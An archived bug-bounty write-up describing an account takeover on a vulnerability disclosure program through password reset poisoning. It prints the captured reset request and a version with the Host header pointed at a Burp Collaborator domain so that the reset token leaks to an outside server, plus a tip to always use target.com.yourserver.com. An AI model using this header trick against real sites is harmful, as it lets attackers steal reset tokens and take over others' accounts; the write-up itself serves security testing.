# My First Account Takeover Via Password Reset Poisoning

- **Source URL:** https://medium.com/@cyberpro151/my-first-account-takeover-via-password-reset-poisoning-7c35baadfbe3?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240420120731/https://medium.com/@cyberpro151/my-first-account-takeover-via-password-reset-poisoning-7c35baadfbe3
- **Fetched:** 2026-11-24
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/5304 (id 5304)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# My First Account Takeover Via Password Reset Poisoning

Hey there everyone! It’s cyberpro151 here and in today’s article, I’ll share with y’all that how I was able to find an Account Takeover vulnerability via Password Reset Poisoning on a VDP program. So let’s get started.

It’s about yesterday that I was testing a subdomain and while testing it, it’s password reset functionality caught my attention. The URL looked something like following:

`target.com/reset-password`
I quickly entered my email and for this particular demonstration, let’s say it was abc@d.com. I quickly fired BurpSuite and then captured the request. The request looked something like following:

```
POST /reset-password HTTP/1.1
Host: target.com
Connection: close
Content-Length: 153
Cache-Control: max-age=0
sec-ch-ua: "Not A(Brand";v="99", "Brave";v="121", "Chromium";v="121"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://target.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://target.com/reset-password
Cookie: passedAgeGate=1; PHPSESSID=e06te8j4gqus9kcsjq2n6okpsb
reset_password_request_form%5Bemail%5D=abc@d.com&reset_password_request_form%5B_token%5D=IAnrYXeFLk6hzMluvOJlPFyMJlwIvvR9ROgUmS0Ls6I
```
Now what I did was that I copied a Burp Collaborator client from the Burp Collaborator client taba and changed the header **“Host”** to following:

`Host: target.com.burpcollaboratorclient.com`
Thus the final request looked something like following:

```
POST /reset-password HTTP/1.1
Host: target.com.burpcollaboratorclient.com
Connection: close
Content-Length: 153
Cache-Control: max-age=0
sec-ch-ua: "Not A(Brand";v="99", "Brave";v="121", "Chromium";v="121"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://target.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://target.com/reset-password
Cookie: passedAgeGate=1; PHPSESSID=e06te8j4gqus9kcsjq2n6okpsb
reset_password_request_form%5Bemail%5D=abc@d.com&reset_password_request_form%5B_token%5D=IAnrYXeFLk6hzMluvOJlPFyMJlwIvvR9ROgUmS0Ls6I
```
I sent the request and it gave me a **“200 OK”** response.

Now I went to my email account and checked it, a password reset link was being sent which looked something like following:

Now I quickly clicked on the link and it looked something like following:

It was time to steal the token. I went back to Burp Collaborator Client tab and clicked on **Poll Now** and bingo! I got some HTTP and DNS requests. I clicked on one of the HTTP request and the request was leaking token as shown below:

Now I quickly copied the token and went to following URL:

`https://target.com/reset/token`
Finally! I was navigated to page where I can enter new password which looked like following:

I entered the new password and clicked on “Reset Password”. Then, I was navigated to login page where I entered the email and new password and I was successfully logged in the account.

**Pro Tip: When testing for Password Reset Poisoning, always change the value of Host to target.com.yourserver.com**

Thanks for reading this article and don’t forget to follow to Follow me. Take care! Bubyee! ❤
